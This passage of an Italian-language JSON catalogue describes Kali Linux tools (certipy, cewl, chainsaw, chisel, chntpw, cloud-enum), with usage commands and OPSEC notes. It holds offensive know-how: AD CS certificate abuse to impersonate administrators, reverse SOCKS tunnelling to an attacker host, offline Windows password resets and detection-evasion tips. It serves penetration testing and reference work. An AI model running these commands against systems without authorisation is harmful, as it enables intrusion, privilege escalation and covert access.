    "version": "5.0.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/certipy-ad/",
    "desc": "Enumera e sfrutta vulnerabilità AD CS (ESC1-ESC8) per privilege escalation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Certipy e uno strumento offensivo scritto in Python specializzato nell'enumerazione e nello sfruttamento delle vulnerabilita di Active Directory Certificate Services (AD CS). Il tool implementa tutti i principali vettori di attacco documentati nella ricerca \"Certified Pre-Owned\" (ESC1 attraverso ESC8), permettendo di identificare e sfruttare misconfigurazioni nei template dei certificati e nei servizi di enrollment. Certipy puo eseguire l'intero ciclo di attacco: dall'enumerazione dei template vulnerabili, alla richiesta di certificati malevoli, fino all'autenticazione tramite PKINIT per ottenere TGT Kerberos. E diventato lo strumento di riferimento per gli attacchi AD CS sia in operazioni di red team che in assessment di sicurezza Active Directory.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Enumerazione completa AD CS:</strong> Certipy enumera automaticamente tutte le Certificate Authority, i template di certificati, le ACL e le configurazioni rilevanti nell'ambiente Active Directory. Il modulo find analizza ogni template verificando le condizioni per ciascuna vulnerabilita ESC nota, producendo un report dettagliato in formato testo e JSON. I template vulnerabili vengono evidenziati con il tipo di vulnerabilita specifica e i requisiti per lo sfruttamento.</p><p><strong>Sfruttamento delle vulnerabilita ESC1-ESC8:</strong> Il tool implementa gli exploit per tutte le principali classi di vulnerabilita AD CS. ESC1 permette di richiedere certificati con SAN arbitrario quando i template lo consentono; ESC4 sfrutta permessi eccessivi sui template per modificarli; ESC8 attacca il servizio web enrollment tramite relay NTLM. Per ogni vulnerabilita, certipy automatizza l'intera catena di sfruttamento dalla richiesta del certificato all'ottenimento delle credenziali.</p><p><strong>Autenticazione e recupero credenziali:</strong> Dopo aver ottenuto un certificato malevolo, certipy utilizza il protocollo PKINIT per autenticarsi a Kerberos e ottenere un TGT. Tramite UnPAC-the-Hash, il tool puo recuperare l'hash NT dell'account target dal TGT stesso. Questo permette di completare l'escalation da un semplice utente di dominio fino a Domain Admin quando le condizioni sono soddisfatte.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Certipy richiede credenziali di dominio valide (anche di un utente a basso privilegio) e connettivita verso il Domain Controller e la Certificate Authority.</p><pre><code># Enumerazione delle vulnerabilita AD CS\ncertipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1\n\n# Enumerazione con output dettagliato\ncertipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1 -vulnerable\n\n# Sfruttamento ESC1 - richiesta certificato con SAN arbitrario\ncertipy req -u user@domain.local -p 'Password123' -ca CORP-CA \\\n  -template VulnTemplate -upn administrator@domain.local\n\n# Autenticazione con il certificato ottenuto\ncertipy auth -pfx administrator.pfx -dc-ip 10.10.10.1\n\n# Sfruttamento ESC8 - NTLM relay al web enrollment\ncertipy relay -ca ca-server.domain.local -template DomainController\n\n# Shadow Credentials attack\ncertipy shadow auto -u user@domain.local -p 'Password123' -account victim$</code></pre><p>Il comando find produce file di output con i risultati dell'enumerazione. I certificati ottenuti vengono salvati in formato PFX e possono essere riutilizzati per l'autenticazione con il comando auth.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il caso d'uso principale e la privilege escalation in ambienti Active Directory durante penetration test e operazioni di red team. Partendo da credenziali di un utente di dominio ordinario, certipy permette di identificare e sfruttare misconfigurazioni AD CS per ottenere certificati che impersonano Domain Admin o altri account privilegiati. Un secondo scenario critico e la persistence: i certificati hanno tipicamente validita di uno o piu anni, permettendo di mantenere l'accesso anche dopo il reset delle password. Certipy e inoltre utilizzato per security assessment specifici di AD CS, dove il modulo find genera report completi sullo stato di sicurezza dell'infrastruttura PKI che possono essere inclusi nei deliverable dell'assessment.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste di certificati vengono registrate nei log della Certificate Authority (Event ID 4886, 4887) e sono facilmente correlabili. L'autenticazione PKINIT genera eventi Kerberos specifici (Event ID 4768 con tipo di pre-autenticazione 16) che possono essere monitorati. L'enumerazione tramite LDAP produce query distintive verso gli oggetti pKIEnrollmentService e certificateTemplate.</p><p><strong>Impatto operativo:</strong> I certificati emessi rimangono validi fino alla scadenza o alla revoca esplicita, creando un rischio di accesso persistente non autorizzato. Le modifiche ai template di certificati (ESC4) alterano la configurazione AD CS e possono impattare i servizi legittimi. L'attacco ESC8 con relay NTLM richiede la cattura di autenticazioni, che puo essere intrusivo nell'ambiente.</p><p><strong>Mitigazioni:</strong> Limitare l'enumerazione al solo modulo find quando possibile, evitando lo sfruttamento su sistemi di produzione critici. Documentare tutti i certificati richiesti per facilitare la revoca post-engagement. Ripristinare immediatamente qualsiasi modifica ai template di certificati. Coordinare con il blue team gli orari delle attivita per minimizzare il rischio di impatti non previsti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "cewl",
    "name": "cewl",
    "version": "6.2.1",
    "icon": "../app/icons/cewl-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cewl/",
    "desc": "Genera wordlist custom crawlando siti web ed estraendo parole uniche.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CeWL (Custom Word List generator) e uno strumento di generazione wordlist che crea dizionari personalizzati crawlando siti web target ed estraendo parole uniche dal contenuto delle pagine. A differenza delle wordlist generiche, le liste generate da CeWL contengono terminologia specifica dell'organizzazione target, inclusi nomi di prodotti, dipendenti, gergo settoriale e acronimi interni. Questo approccio aumenta significativamente l'efficacia degli attacchi di password cracking e brute-forcing, poiche gli utenti tendono a creare password basate su parole familiari dal loro contesto lavorativo. CeWL supporta crawling ricorsivo, estrazione di email, autenticazione e personalizzazione avanzata delle regole di estrazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Crawling ricorsivo e estrazione parole:</strong> CeWL naviga il sito web target seguendo i link interni fino a una profondita configurabile, estraendo tutte le parole uniche dal contenuto HTML di ogni pagina. E possibile specificare la lunghezza minima delle parole per filtrare articoli, preposizioni e altri termini troppo brevi per essere password plausibili. Il crawler rispetta i parametri di scope per evitare di uscire dal dominio target.</p><p><strong>Estrazione di indirizzi email:</strong> Oltre alle parole, CeWL puo estrarre indirizzi email trovati nelle pagine crawlate, generando una lista separata utilizzabile per attacchi di phishing o come username per il brute-forcing. Le email vengono estratte tramite pattern matching e deduplicate automaticamente. Questa funzionalita combina raccolta OSINT e generazione wordlist in un unico passaggio.</p><p><strong>Personalizzazione e autenticazione:</strong> CeWL supporta l'autenticazione HTTP Basic e form-based per accedere ad aree protette del sito. E possibile specificare User-Agent personalizzati, proxy, header custom e cookie per simulare la navigazione di un browser legittimo. Il tool supporta anche l'estrazione di parole da documenti metadata (PDF, DOC, XLSX) trovati durante il crawling.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>CeWL si utilizza specificando l'URL del sito target e le opzioni di configurazione per il crawling e l'estrazione delle parole.</p><pre><code># Generazione wordlist base\ncewl http://target.com -w wordlist.txt\n\n# Crawling con profondita 3 e parole minimo 6 caratteri\ncewl http://target.com -d 3 -m 6 -w wordlist.txt\n\n# Estrazione email in file separato\ncewl http://target.com -e --email_file emails.txt -w wordlist.txt\n\n# Crawling con autenticazione\ncewl http://target.com --auth_type basic --auth_user admin --auth_pass password -w wordlist.txt\n\n# Inclusione di meta-dati dai documenti\ncewl http://target.com -a --meta_file meta.txt -w wordlist.txt\n\n# Aggiunta di numeri alle parole\ncewl http://target.com --with-numbers -w wordlist.txt\n\n# Utilizzo con proxy e User-Agent custom\ncewl http://target.com --proxy_host 127.0.0.1 --proxy_port 8080 -u \"Mozilla/5.0\" -w wordlist.txt</code></pre><p>Le wordlist generate possono essere ulteriormente elaborate con strumenti come John the Ripper (regole di mangling) o hashcat per creare varianti con maiuscole, numeri e caratteri speciali.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il caso d'uso principale e la generazione di wordlist personalizzate per attacchi di password cracking durante penetration test. Crawlando il sito aziendale del target, CeWL estrae terminologia specifica che viene poi utilizzata con hashcat o John the Ripper per crackare hash di password. Un secondo scenario importante e la preparazione di dizionari per il brute-forcing di servizi di autenticazione (SSH, RDP, VPN, portali web), dove wordlist mirate hanno un tasso di successo molto superiore rispetto a dizionari generici come rockyou.txt. CeWL e inoltre utile nella fase di OSINT per raccogliere informazioni sull'organizzazione target: nomi di dipendenti, progetti, prodotti e tecnologie utilizzate emergono naturalmente dalla wordlist generata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il crawling di CeWL genera traffico HTTP visibile nei log del web server e puo essere rilevato da WAF e sistemi anti-bot. Il pattern di navigazione automatizzata e distinguibile dal comportamento umano per velocita e sistematicita. L'User-Agent predefinito di CeWL e identificabile come crawler automatizzato.</p><p><strong>Impatto operativo:</strong> Il crawling ricorsivo con profondita elevate puo generare un carico significativo sul web server target. Le parole estratte e le email raccolte devono essere gestite come dati sensibili e protette adeguatamente. La wordlist risultante rivela informazioni sulla strategia di attacco se intercettata.</p><p><strong>Mitigazioni:</strong> Configurare un User-Agent che simuli un browser reale. Limitare la velocita di crawling con delay tra le richieste. Utilizzare proxy o VPN per mascherare l'indirizzo IP sorgente. Impostare profondita di ricorsione ragionevoli per evitare crawling eccessivo. Conservare le wordlist generate in modo sicuro e distruggerle al termine dell'engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists",
      "Generators"
    ],
    "notes": null
  },
  {
    "id": "chainsaw",
    "name": "chainsaw",
    "version": "2.12.2",
    "icon": "../app/icons/chainsaw-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/chainsaw/",
    "desc": "Analizza rapidamente log Windows (EVTX) con regole Sigma e hunting automatizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Chainsaw e uno strumento di analisi forense sviluppato da WithSecure che permette di analizzare rapidamente log di eventi Windows (EVTX), log MFT, Shimcache, Amcache, SRUM e registri di sistema. Il tool utilizza regole Sigma e logiche di detection personalizzate per identificare automaticamente attivita sospette nei log, accelerando drasticamente il processo di triage rispetto all'analisi manuale. Chainsaw e scritto in Rust per garantire prestazioni elevate anche su grandi volumi di dati forensi. E diventato uno strumento essenziale nel toolkit di incident response e digital forensics per la sua capacita di processare gigabyte di log in pochi secondi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Hunting con regole Sigma:</strong> Chainsaw integra nativamente il supporto per le regole Sigma, lo standard de facto per le detection rule nei log di eventi. E possibile eseguire centinaia di regole Sigma contemporaneamente contro i log EVTX, identificando automaticamente tecniche di attacco note come lateral movement, privilege escalation, persistence e credential dumping. Le regole vengono aggiornate regolarmente dalla community Sigma e possono essere personalizzate per esigenze specifiche.</p><p><strong>Analisi rapida di artefatti Windows:</strong> Oltre ai log EVTX, Chainsaw analizza artefatti forensi come Shimcache, Amcache, SRUM e prefetch per ricostruire l'esecuzione di programmi nel tempo. Il modulo di analisi MFT permette di esaminare la timeline del file system NTFS. Questa capacita multi-artefatto consente di correlare informazioni da diverse fonti per costruire una timeline completa dell'incidente.</p><p><strong>Output strutturato e reporting:</strong> Chainsaw produce output in formati multipli tra cui tabelle ASCII, CSV, JSON e Markdown, facilitando l'integrazione in workflow di analisi e la generazione di report. I risultati includono timestamp, ID evento, dettagli della detection e contesto rilevante estratto direttamente dai log. Il formato JSON e particolarmente utile per l'ingestione in piattaforme SIEM o strumenti di analisi personalizzati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Chainsaw si utilizza da linea di comando specificando l'azione desiderata, la directory dei log e le regole di detection da applicare.</p><pre><code># Hunting con regole Sigma su log EVTX\nchainsaw hunt /path/to/evtx/ -s sigma/rules/ --mapping mappings/sigma-event-logs-all.yml\n\n# Ricerca con output JSON\nchainsaw hunt /path/to/evtx/ -s sigma/rules/ --json -o results.json\n\n# Ricerca di eventi specifici per keyword\nchainsaw search -t \"mimikatz\" /path/to/evtx/\n\n# Analisi Shimcache\nchainsaw analyse shimcache /path/to/SYSTEM\n\n# Dump completo degli eventi in formato tabellare\nchainsaw dump /path/to/evtx/ --output csv -o events.csv\n\n# Hunting con regole custom\nchainsaw hunt /path/to/evtx/ -r custom_rules/ --mapping mappings/sigma-event-logs-all.yml\n\n# Filtraggio per range temporale\nchainsaw hunt /path/to/evtx/ -s sigma/rules/ --from \"2024-01-15T00:00:00\" --to \"2024-01-16T00:00:00\"</code></pre><p>Per risultati ottimali, mantenere aggiornate le regole Sigma e i mapping. Chainsaw include regole Sigma predefinite e mapping nel repository ufficiale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il caso d'uso primario e il triage rapido durante un incident response, dove chainsaw permette di analizzare in pochi secondi log EVTX raccolti da sistemi compromessi per identificare le tecniche di attacco utilizzate. Questo accelera drasticamente la fase iniziale dell'investigazione, consentendo al team di risposta di focalizzarsi immediatamente sugli artefatti rilevanti. Un secondo caso d'uso e l'analisi forense approfondita post-incidente, dove chainsaw viene utilizzato per ricostruire la timeline completa dell'attacco correlando eventi da log EVTX, Shimcache, Amcache e MFT. Chainsaw e inoltre utilizzato per la validazione delle detection rule: i team di sicurezza possono eseguire le proprie regole Sigma contro log storici per verificare l'efficacia delle detection prima del deployment in produzione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Chainsaw e uno strumento di analisi offline che opera su copie dei log, quindi non genera attivita rilevabile sui sistemi in esame. L'esecuzione avviene sulla workstation dell'analista e non richiede connessioni di rete verso i sistemi target. Non ci sono considerazioni OPSEC offensive poiche si tratta di uno strumento primariamente difensivo.</p><p><strong>Impatto operativo:</strong> L'analisi di grandi volumi di log puo richiedere risorse significative di CPU e memoria sulla workstation dell'analista. I risultati dell'analisi contengono informazioni sensibili sull'incidente e devono essere protetti adeguatamente. La qualita dei risultati dipende direttamente dalla completezza dei log raccolti e dall'aggiornamento delle regole Sigma.</p><p><strong>Mitigazioni:</strong> Assicurarsi di operare su copie forensi dei log e mai sui file originali per preservare l'integrita delle evidenze. Cifrare i risultati dell'analisi e limitarne l'accesso al team di investigazione. Mantenere le regole Sigma aggiornate per identificare le tecniche di attacco piu recenti. Validare i risultati positivi con analisi manuale per escludere falsi positivi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "chisel-kali",
    "name": "chisel",
    "version": "1.10.1",
    "icon": "../app/icons/chisel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/chisel/",
    "desc": "Tunnel TCP/UDP veloce over HTTP, perfetto per pivoting in ambienti restrittivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Chisel e un tool di tunneling TCP/UDP veloce che trasporta il traffico attraverso connessioni HTTP, ottimizzato per il pivoting in ambienti di rete restrittivi. Scritto in Go come singolo binario senza dipendenze, puo essere facilmente trasferito e eseguito su sistemi compromessi senza necessita di installazione. Chisel opera in modalita client-server: il server viene eseguito sulla macchina dell'attaccante e il client sul sistema compromesso, stabilendo un tunnel cifrato over HTTP/HTTPS che attraversa la maggior parte dei firewall e proxy aziendali. Supporta port forwarding locale e remoto, SOCKS proxy e puo operare attraverso proxy HTTP intermedi, rendendolo uno degli strumenti di pivoting piu versatili disponibili.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Tunnel TCP/UDP over HTTP:</strong> Chisel incapsula il traffico TCP e UDP all'interno di connessioni HTTP/HTTPS utilizzando WebSocket, permettendo di attraversare firewall e proxy che bloccherebbero connessioni dirette. Il protocollo HTTP e ubiquitario nelle reti aziendali e raramente bloccato in uscita, rendendo chisel efficace anche in ambienti con politiche di rete molto restrittive. La comunicazione e cifrata con SSH over WebSocket, garantendo confidenzialita del traffico tunnelato.</p><p><strong>Port forwarding e SOCKS proxy:</strong> Chisel supporta sia port forwarding locale (accesso a servizi remoti dalla macchina dell'attaccante) che remoto (esposizione di servizi locali verso il server). La modalita SOCKS5 proxy trasforma il sistema compromesso in un punto di accesso completo alla rete interna, permettendo di utilizzare qualsiasi strumento attraverso il tunnel. E possibile configurare multiple regole di forwarding simultaneamente su una singola connessione.</p><p><strong>Binario standalone e cross-platform:</strong> Compilato in Go come singolo binario statico, chisel e disponibile per Windows, Linux, macOS e diverse architetture (amd64, arm, arm64). Non richiede librerie esterne, interpreti o installazione, rendendolo ideale per il deployment rapido su sistemi compromessi. La dimensione ridotta del binario (circa 8-10 MB) facilita il trasferimento anche su connessioni lente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Chisel richiede l'avvio del componente server sulla macchina dell'attaccante e del client sul sistema compromesso. Le regole di forwarding vengono specificate come argomenti del client.</p><pre><code># Avvio del server sulla macchina dell'attaccante\nchisel server --reverse --port 8080\n\n# Client - reverse SOCKS proxy (sul sistema compromesso)\nchisel client attacker-ip:8080 R:socks\n\n# Client - port forwarding remoto specifico\nchisel client attacker-ip:8080 R:3389:internal-host:3389\n\n# Client - port forwarding locale\nchisel client attacker-ip:8080 8888:internal-db:3306\n\n# Server con autenticazione\nchisel server --reverse --port 443 --auth user:password\n\n# Client attraverso proxy HTTP aziendale\nchisel client --proxy http://proxy:8080 attacker-ip:443 R:socks\n\n# Utilizzo del SOCKS proxy con proxychains\nproxychains nmap -sT -Pn internal-host</code></pre><p>La modalita reverse SOCKS e la piu utilizzata: crea un listener SOCKS5 sulla macchina dell'attaccante (default porta 1080) che instrada il traffico attraverso il sistema compromesso verso la rete interna.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il caso d'uso primario e il pivoting durante penetration test e operazioni di red team, dove chisel viene deployato su un sistema compromesso nella DMZ per ottenere accesso alla rete interna. Il tunnel HTTP attraversa i firewall che bloccano connessioni dirette, permettendo di raggiungere servizi interni non esposti. Un secondo scenario e il bypass di segmentazione di rete: quando si compromette un host in un segmento e si necessita di accedere a servizi in un segmento diverso, chisel crea un ponte trasparente. Chisel e inoltre utilizzato per l'esfiltrazione di dati attraverso reti monitorate, poiche il traffico appare come normale comunicazione HTTP/HTTPS verso un server web legittimo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico WebSocket di chisel ha pattern caratteristici che possono essere identificati tramite deep packet inspection. Le connessioni persistenti verso un singolo endpoint con traffico bidirezionale continuo sono anomale per il normale traffico HTTP. Soluzioni EDR possono rilevare il binario chisel sul sistema tramite signature o behavioral analysis durante l'esecuzione.</p><p><strong>Impatto operativo:</strong> Il tunnel chisel introduce latenza e overhead nel traffico di rete, che puo impattare la velocita degli strumenti utilizzati attraverso il proxy. Il binario lascia artefatti sul file system del sistema compromesso. Le connessioni persistenti generano traffico continuo che puo essere anomalo per il profilo di rete del sistema.</p><p><strong>Mitigazioni:</strong> Utilizzare la porta 443 per il server chisel per mimetizzarsi con il traffico HTTPS normale. Rinominare il binario con un nome plausibile per il contesto del sistema compromesso. Configurare l'autenticazione sul server per prevenire l'utilizzo non autorizzato del tunnel. Rimuovere il binario e terminare le connessioni al completamento dell'attivita. Considerare l'utilizzo di proxy header personalizzati per imitare traffico legittimo.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "chntpw",
    "name": "chntpw",
    "version": "140201",
    "icon": "../app/icons/chntpw-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/chntpw/",
    "desc": "Resetta o modifica password Windows NT/2000/XP/Vista/7 dal file SAM offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Chntpw (Change NT Password) e uno strumento per il reset e la modifica delle password degli account Windows NT/2000/XP/Vista/7/8/10/11 operando direttamente sul file SAM (Security Account Manager) in modalita offline. Il tool non richiede la conoscenza della password corrente: modifica direttamente le strutture dati nel registro di Windows per azzerare o cambiare le password, abilitare o disabilitare account e modificare i privilegi di gruppo. Chntpw opera tipicamente da un sistema live Linux (come Kali) montando la partizione Windows e accedendo al file SAM situato in Windows/System32/config. E uno strumento essenziale per il recupero dell'accesso a sistemi Windows con password dimenticate e per analisi forensi offline.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Reset password offline:</strong> La funzionalita principale di chntpw e il reset delle password degli account locali Windows modificando direttamente il file SAM. Il tool puo azzerare la password (impostarla vuota), permettendo il login senza password, oppure impostare una nuova password specifica. Questa operazione avviene completamente offline, senza bisogno di avviare il sistema operativo Windows e senza lasciare tracce nei log di eventi di Windows.</p><p><strong>Gestione account e gruppi:</strong> Oltre al reset delle password, chntpw permette di abilitare account disabilitati, sbloccare account bloccati e modificare l'appartenenza ai gruppi. E possibile promuovere un account utente standard ad amministratore aggiungendolo al gruppo Administrators direttamente nel registro. Queste operazioni sono particolarmente utili quando l'account Administrator e stato disabilitato o quando si necessita di privilege escalation offline.</p><p><strong>Editor del registro interattivo:</strong> Chntpw include un editor interattivo del registro Windows che permette di navigare e modificare qualsiasi chiave di registro nei file hive (SAM, SYSTEM, SOFTWARE, SECURITY). Questo va oltre la semplice gestione delle password, consentendo modifiche arbitrarie alla configurazione del sistema operativo. L'editor supporta la visualizzazione e modifica di valori REG_SZ, REG_DWORD, REG_BINARY e altri tipi di registro.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Chntpw richiede l'accesso fisico o da sistema live al file SAM di Windows, tipicamente montando la partizione NTFS dal sistema live Kali Linux.</p><pre><code># Montare la partizione Windows\nmount /dev/sda2 /mnt/windows\n\n# Navigare alla directory del registro\ncd /mnt/windows/Windows/System32/config\n\n# Elencare gli utenti nel file SAM\nchntpw -l SAM\n\n# Reset interattivo della password (menu guidato)\nchntpw -i SAM\n\n# Reset password di un utente specifico\nchntpw -u Administrator SAM\n\n# Editing del registro SYSTEM\nchntpw -e SYSTEM\n\n# Reset password con file SAM e SYSTEM\nchntpw -u Administrator SAM SYSTEM SECURITY</code></pre><p>Il menu interattivo (-i) e il modo piu sicuro di operare: guida l'utente attraverso le opzioni disponibili e chiede conferma prima di scrivere le modifiche. E fondamentale smontare la partizione correttamente dopo le modifiche per evitare corruzione del file system.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il caso d'uso piu comune e il recupero dell'accesso a sistemi Windows con password dimenticate, sia in contesti IT aziendali che personali. L'amministratore di sistema avvia il computer da un live USB Kali e utilizza chntpw per azzerare la password dell'account Administrator locale. Nel contesto di un penetration test fisico, chntpw viene utilizzato quando si ottiene accesso fisico a un workstation Windows: il reset della password dell'amministratore locale permette di accedere al sistema e procedere con l'enumerazione della rete e il movement laterale. Un terzo caso d'uso e l'analisi forense offline: chntpw permette di esaminare gli account presenti nel file SAM, i loro attributi e l'appartenenza ai gruppi senza alterare il sistema, fornendo informazioni utili per la ricostruzione dell'incidente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le modifiche effettuate da chntpw non generano eventi nei log di Windows poiche avvengono offline. Tuttavia, al successivo avvio, l'assenza di password o una password diversa puo essere notata dall'utente legittimo. I sistemi con BitLocker o altre soluzioni di cifratura del disco impediscono l'accesso al file SAM senza la chiave di recovery. Le soluzioni di integrity monitoring possono rilevare modifiche al file SAM al riavvio.</p><p><strong>Impatto operativo:</strong> Il reset della password modifica permanentemente il file SAM e non e reversibile senza un backup preventivo. L'azzeramento della password invalida le credenziali cached per i servizi che le utilizzano. In ambienti con DPAPI, il reset della password rende inaccessibili i dati cifrati con le credenziali precedenti (certificati, password salvate nel browser, file EFS).</p><p><strong>Mitigazioni:</strong> Creare sempre un backup del file SAM prima delle modifiche. Preferire il reset a password vuota piuttosto che l'impostazione di una nuova password. Documentare le modifiche effettuate per il ripristino post-assessment. Considerare che il reset invalida DPAPI e informare il cliente di questo effetto collaterale. Verificare la presenza di BitLocker o cifratura disco prima di procedere.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "cloud-enum",
    "name": "cloud-enum",
    "version": "0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cloud-enum/",
    "desc": "Enumera risorse cloud pubbliche (S3, Azure blobs, GCP buckets) di un target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Cloud-enum e uno strumento di enumerazione che identifica risorse cloud pubbliche appartenenti a un'organizzazione target attraverso i principali provider: Amazon Web Services (S3 buckets), Microsoft Azure (blob storage, app services, database) e Google Cloud Platform (buckets, app engine, Firebase). Il tool utilizza tecniche di brute-forcing basate su keyword per generare permutazioni del nome dell'organizzazione e verificare l'esistenza di risorse cloud con naming convention prevedibili. Cloud-enum opera senza autenticazione, verificando esclusivamente risorse pubblicamente accessibili o la cui esistenza e confermabile tramite risposte HTTP. E uno strumento fondamentale nella fase di ricognizione per mappare la superficie di attacco cloud del target.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Enumerazione multi-cloud:</strong> Cloud-enum verifica simultaneamente l'esistenza di risorse su AWS, Azure e GCP, coprendo i tre principali provider cloud. Per AWS, cerca S3 buckets con diverse permutazioni del nome target. Per Azure, verifica blob storage, app services, database e altri servizi. Per GCP, enumera buckets, app engine instances, Firebase database e Cloud Functions. Questo approccio multi-cloud e essenziale perche le organizzazioni moderne utilizzano spesso servizi da provider diversi.</p><p><strong>Generazione di permutazioni intelligente:</strong> Il tool genera automaticamente varianti del keyword fornito combinandolo con prefissi e suffissi comuni come dev, staging, prod, backup, test, data, files e molti altri. Le permutazioni includono variazioni con trattini, underscore, numeri e abbreviazioni tipiche delle naming convention cloud. E possibile fornire un file di mutazioni personalizzato per adattare la ricerca al contesto specifico del target.</p><p><strong>Verifica di accessibilita:</strong> Oltre a verificare la mera esistenza delle risorse cloud, cloud-enum tenta di determinare se i bucket e i blob trovati sono accessibili pubblicamente. Per i bucket S3, verifica se il listing e abilitato o se i file sono scaricabili. Questa distinzione e cruciale perche un bucket esistente ma non accessibile ha un profilo di rischio diverso da uno con accesso pubblico configurato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Cloud-enum si avvia specificando il keyword base (tipicamente il nome dell'organizzazione) e le opzioni desiderate per il tipo di enumerazione e l'output.</p><pre><code># Enumerazione completa su tutti i provider\ncloud_enum -k company-name\n\n# Enumerazione con file di mutazioni personalizzato\ncloud_enum -k company-name -m mutations.txt\n\n# Solo enumerazione AWS S3\ncloud_enum -k company-name --disable-azure --disable-gcp\n\n# Solo enumerazione Azure\ncloud_enum -k company-name --disable-aws --disable-gcp\n\n# Con keyword multipli da file\ncloud_enum -kf keywords.txt\n\n# Output su file\ncloud_enum -k company-name -l results.txt\n\n# Enumerazione con thread multipli\ncloud_enum -k company-name -t 20</code></pre><p>Per risultati ottimali, utilizzare varianti del nome dell'organizzazione come keyword (nome completo, abbreviazione, ticker azionario). Il file di mutazioni personalizzato puo includere nomi di progetti, prodotti o team specifici del target scoperti nella fase OSINT.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Il caso d'uso principale e la fase di ricognizione in un penetration test o bug bounty, dove cloud-enum viene utilizzato per scoprire risorse cloud pubbliche che espandono la superficie di attacco del target. Bucket S3 accessibili pubblicamente con dati sensibili sono una delle vulnerabilita piu comuni nel cloud e rappresentano spesso quick win significativi. Un secondo caso d'uso e l'assessment della postura di sicurezza cloud di un'organizzazione: il team di sicurezza interno utilizza cloud-enum per verificare se risorse cloud create da diversi team sono esposte pubblicamente senza autorizzazione. Cloud-enum e inoltre utile per la due diligence in operazioni di M&A (Mergers and Acquisitions), dove e necessario valutare rapidamente l'esposizione cloud di un'organizzazione da acquisire.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste di enumerazione vengono effettuate direttamente verso le API dei cloud provider (AWS, Azure, GCP) e non verso l'infrastruttura del target, rendendo l'attivita difficile da rilevare per l'organizzazione target. Tuttavia, i cloud provider possono rilevare e limitare (rate-limit) attivita di enumerazione massiva da un singolo indirizzo IP. Le organizzazioni con AWS CloudTrail configurato sui bucket S3 possono registrare i tentativi di accesso.</p><p><strong>Impatto operativo:</strong> L'enumerazione e un'attivita non intrusiva che non modifica alcuna risorsa cloud. Il volume di richieste HTTP generato puo essere significativo con grandi file di mutazioni, ma non impatta le risorse del target. I risultati dell'enumerazione rivelano informazioni sulla naming convention e la struttura cloud dell'organizzazione.</p><p><strong>Mitigazioni:</strong> Distribuire le richieste nel tempo e utilizzare thread moderati per evitare rate limiting. Utilizzare diversi indirizzi IP sorgente per enumerazioni estese. Mantenere riservati i risultati dell'enumerazione poiche contengono informazioni sensibili sulla superficie di attacco del target. Verificare manualmente l'accessibilita delle risorse trovate prima di includerle nel report.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Cloud_Enum"
    ],
    "notes": null
  },
  {
    "id": "cloudbrute",
    "name": "cloudbrute",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cloudbrute/",
    "desc": "Trova storage cloud mal configurati tramite brute force di nomi comuni.",
